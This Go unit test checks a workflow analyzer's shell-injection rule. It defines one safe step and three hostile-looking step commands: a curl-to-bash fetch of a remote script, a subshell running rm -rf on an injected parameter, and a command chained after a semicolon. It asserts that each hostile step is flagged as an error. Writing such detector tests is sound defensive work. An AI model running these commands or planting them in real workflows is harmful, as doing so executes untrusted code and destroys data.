package analyzer

import (
	"testing"
)

func TestShellInjectionDetection(t *testing.T) {
	rule := ShellInjectionRule{}

	ast := &WorkflowAST{
		WorkflowID: "wf-sec-test",
		Parameters: map[string]string{
			"user_arg": "safe",
			"target":   "host",
		},
		Steps: map[string]StepNode{
			"safe-step": {
				ID:      "safe-step",
				Command: "ls -la /var/log",
			},
			"pipe-to-bash": {
				ID:      "pipe-to-bash",
				Command: "curl https://example.com/script.sh | bash",
			},
			"subshell-injection": {
				ID:      "subshell-injection",
				Command: "echo $(rm -rf /tmp/${inputs.target})",
			},
			"chain-injection": {
				ID:      "chain-injection",
				Command: "echo hello; ${inputs.user_arg}",
			},
		},
	}

	diags := rule.Analyze(ast)

	// safe-step should have 0 diagnostics
	for _, d := range diags {
		if d.StepID == "safe-step" {
			t.Fatalf("safe-step should not trigger shell injection diagnostic: %v", d)
		}
	}

	// Should flag pipe-to-bash, subshell-injection, chain-injection
	flaggedSteps := make(map[string]bool)
	for _, d := range diags {
		flaggedSteps[d.StepID] = true
		if d.Severity != SeverityError {
			t.Fatalf("expected SeverityError for injection rule, got %s", d.Severity)
		}
	}

	if !flaggedSteps["pipe-to-bash"] {
		t.Fatalf("expected pipe-to-bash to be flagged")
	}
	if !flaggedSteps["subshell-injection"] {
		t.Fatalf("expected subshell-injection to be flagged")
	}
	if !flaggedSteps["chain-injection"] {
		t.Fatalf("expected chain-injection to be flagged")
	}
}
